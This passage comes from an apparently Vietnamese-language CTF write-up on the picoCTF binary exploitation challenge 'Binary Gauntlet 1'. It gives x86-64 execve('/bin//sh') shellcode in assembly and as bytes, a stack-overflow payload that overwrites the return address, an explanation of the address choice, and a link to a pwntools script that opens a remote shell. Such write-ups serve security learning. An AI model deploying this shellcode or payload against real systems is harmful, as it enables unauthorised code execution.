push rax
mov rdi, rsp

xor rsi, rsi
xor rdx, rdx

xor rax, rax
xor rax, 0x3b

syscall
```
__Shellcode sau khi assemble__:
```
\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05
```

__Chuỗi payload input lần 2__:
```
"\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05" + "a"*33 + dest_addr
```
Chắc bạn cũng đã để ý rằng ở đây mình phải dùng địa chỉ `dest_addr` trong stack chứa shellcode thay vì địa chỉ `s` trong heap cũng chứa shellcode.    
Bởi vì địa chỉ `s` trong heap là 0x602260 chỉ có 3 bytes, nhưng 1 stack trong kiến trúc 64-bit có thể chứa 8 bytes, mà mình lại không thể ghi thêm 0x0000000000 vào chuỗi để nó trở thành 0x0000000000602260, nên nếu trong stack đã có sẵn 1 vài bytes bất kì thì lúc ghi đè vào return address, return address sẽ trở thành 0x??????????602260 (?? là 1 byte bất kì có sẵn trong stack, có thể bằng 0x00, có thể bằng giá trị khác) => sai địa chỉ chứa shellcode => lỗi thực thi chương trình.   
Vì vậy mình sẽ dùng `dest_addr` có đến tận 7 bytes, tính thêm kí tự \x00 ở cuối chuỗi sau khi `p64()` thì sẽ thành 8 bytes, vừa đủ làm return address trong stack.    

### Viết và chạy script để khai thác chương trình trên remote server

[Sử dụng công cụ pwntools](https://github.com/BuiKimPhat/ctf-writeup/tree/master/pwn#s%E1%BB%AD-d%E1%BB%A5ng-pwntools) để viết script kết nối với remote server, input các payload, nhận các output và lấy shell để tương tác tự do với remote server.    

Chạy [file script exp.py](https://github.com/BuiKimPhat/ctf-writeup/blob/master/pwn/picoctf/binaryGauntlet_01/exp.py) rồi `cat flag.txt` để lấy flag thôi chứ còn chần chờ gì nữa!   
